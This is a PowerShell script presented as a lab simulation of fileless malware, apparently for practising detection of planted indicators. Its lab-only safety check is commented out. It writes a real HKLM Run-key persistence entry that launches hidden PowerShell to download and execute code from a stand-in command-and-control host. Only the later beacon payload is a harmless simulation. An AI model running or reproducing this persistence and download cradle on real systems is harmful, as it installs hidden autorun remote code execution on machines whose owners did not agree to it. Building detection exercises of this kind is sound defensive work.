# Plant-FilelessMalware.ps1
# Simulates fileless malware by creating registry persistence and in-memory payload

# Safety check: Ensure script runs in a lab environment
$computerName = $env:COMPUTERNAME
<#if ($computerName -notlike "*LAB*") {
    Write-Warning "This script should only run in a lab environment (e.g., computer name with 'LAB'). Exiting."
    exit
}
#>
# Define registry path for persistence
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "MalwarePersist"
$payloadCommand = "powershell.exe -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://fake-c2-server.com/payload')"

# Create registry key for persistence
try {
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    New-ItemProperty -Path $regPath -Name $regName -Value $payloadCommand -PropertyType String -Force | Out-Null
    Write-Output "Created registry persistence at $regPath\$regName"
} catch {
    Write-Warning "Failed to create registry key: $_"
}

# Simulate in-memory payload execution (without actual network connection)
$fakePayload = @"
# Simulated malicious payload
while ($true) {
    Write-Output 'Simulating C2 beacon to fake-c2-server.com at $(Get-Date)'
    Start-Sleep -Seconds 60
}
"@
try {
    $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($fakePayload))
    $command = "powershell.exe -EncodedCommand $encodedPayload"
    Write-Output "Simulating in-memory payload execution..."
    Write-Output "Payload would beacon every 60 seconds (simulated, no real connection)."
    Write-Output "Sample payload output: 'Simulating C2 beacon to fake-c2-server.com'"
} catch {
    Write-Warning "Error simulating payload: $_"
}

# Verify registry persistence
Write-Output "`nVerifying planted IOCs..."
$regValue = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
if ($regValue) {
    Write-Output "Registry IOC found: $regPath\$regName"
    Write-Output "Value: $($regValue.$regName)"
} else {
    Write-Warning "Registry IOC not found."
}